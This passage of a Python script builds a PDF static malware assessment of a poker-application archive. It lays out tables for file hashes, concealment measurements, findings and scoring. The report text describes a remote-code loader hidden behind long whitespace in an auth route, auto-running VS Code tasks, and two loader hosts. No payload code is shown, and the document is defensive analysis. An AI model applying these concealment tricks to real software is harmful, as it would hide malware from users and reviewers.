            "Hashes are SHA-256 of the file bytes at the time of this review. A one-byte edit changes them. They identify this sample; they will not match a cleaned copy."
        ),
    ]
    story.append(
        styled_table(
            ["File", "Bytes", "SHA-256"],
            [
                [".vscode/tasks.json", f"{ctx['sizes']['tasks']:,}", ctx["hashes"]["tasks"]],
                ["routes/api/auth.js", f"{ctx['sizes']['auth']:,}", ctx["hashes"]["auth"]],
                ["package.json", f"{ctx['sizes']['package']:,}", ctx["hashes"]["package"]],
                ["README.md", f"{ctx['sizes']['readme']:,}", ctx["hashes"]["readme"]],
                ["controllers/auth.js", f"{ctx['sizes']['login']:,}", ctx["hashes"]["login"]],
                ["server.js", f"{ctx['sizes']['server']:,}", ctx["hashes"]["server"]],
                ["config.js", f"{ctx['sizes']['config']:,}", ctx["hashes"]["config"]],
            ],
            [1.7 * inch, 0.7 * inch, 4.65 * inch],
        )
    )
    story += [
        h2("Measured concealment"),
    ]
    story.append(
        styled_table(
            ["Measurement", "Value"],
            [
                ["Lines in routes/api/auth.js", str(ctx["auth_line_count"])],
                ["Characters on line 20", f"{ctx['auth_line20_length']:,}"],
                ["Spaces between the export and the payload", f"{ctx['auth_gap']:,}"],
                ["Lines in .vscode/tasks.json", str(ctx["tasks_lines"])],
                ["Shell-command lines", gap_note],
                ["editor.wordWrap in .vscode/settings.json", "off"],
                ["node_modules on disk during review", "absent" if not ctx["node_modules"] else "present"],
                ["Files walked", str(ctx["file_count"])],
            ],
            [3.3 * inch, 3.75 * inch],
        )
    )
    story += [
        h2("Finding index"),
    ]
    story.append(
        styled_table(
            ["ID", "Sev.", "L", "I", "Title"],
            [
                [row["id"], row["severity"], str(row["likelihood"]), str(row["impact"]), esc(row["title"])]
                for row in FINDINGS
            ],
            [0.55 * inch, 0.75 * inch, 0.35 * inch, 0.35 * inch, 5.05 * inch],
        )
    )
    story += [
        h2("Scoring"),
        P(
            "Likelihood and impact are 1 to 5, assigned by this review, not taken from a scanner. Likelihood 5 means the behavior happens whenever that function or command runs. Likelihood 4 means a current editor will usually ask before folder-open tasks run. Impact 5 means arbitrary code execution as the user. Impact 4 means account takeover inside the application, or a document that reliably drives the victim into the critical path. Impact 3 is a serious integrity or exposure flaw whose blast radius stays inside the application or depends on a secret the archive does not contain. Impact 2 is a real defect with a narrower effect."
        ),
        P(
            "Heat-map cells use the same 0 to 5 range and are explained under Figure 8. They are not CVSS scores. A CVSS number would flatten the difference between a password bypass on a server that cannot be started safely and a dropper that runs at install, and that difference is the point of the review."
        ),
        h2("Artifacts produced with this report"),
        P(
            "The figures were drawn with seaborn 0.13 and matplotlib, from the tables in this document, and embedded in the PDF. The generator and the PNG files sit in the security-report folder next to the archive. Generating them does not import or execute any file from the poker application. The decoded loader text used to confirm behavior was written to a temporary file, read, and deleted. It is not included here."
        ),
        h2("Statement of work performed"),
        P(
            "Static inspection, pattern search, file measurement, cryptographic hashing, offline XOR decode of one blob, and the charts and narrative in this document. No dynamic analysis. No packet capture. No contact with api-checking-1.vercel.app or 88.216.57.122. No claim is made about the contents of the programs those hosts would have returned on 21 November 2026 or any other date."
        ),
        Spacer(1, 8),
        callout(
            "<b>End of report.</b> The archive is a hostile sample with a poker application and a false product description wrapped around two remote-code loaders. Do not install it, do not start it, and do not approve its editor tasks.",
            border=NAVY,
            bg="#F4F6F8",
        ),
    ]
    return story


def main() -> None:
    global S
    os.makedirs(OUT_DIR, exist_ok=True)
    register_fonts()
    S = build_styles()
    ctx = collect_evidence()
    figures = make_figures(ctx)
    document = ReportDoc(
        PDF_PATH,
        pagesize=letter,
        title="Zyranova archive — malware and security assessment",
        author="Static security assessment",
        subject="Confidential malware assessment of the local Zyranova archive. Code was not executed.",
        creator="Static assessment report",
    )
    frame_cover = Frame(0.75 * inch, 0.6 * inch, 7.0 * inch, 8.6 * inch, id="cover", showBoundary=0)
    frame_body = Frame(0.7 * inch, 0.55 * inch, 7.1 * inch, 9.35 * inch, id="body", showBoundary=0)
    document.addPageTemplates(
        [
            PageTemplate(id="cover", frames=[frame_cover], onPage=draw_cover),
            PageTemplate(id="body", frames=[frame_body], onPage=draw_body),
        ]
    )
    document.build(story_for(ctx, figures))
    print(PDF_PATH)
    print("bytes", os.path.getsize(PDF_PATH))


if __name__ == "__main__":
    main()
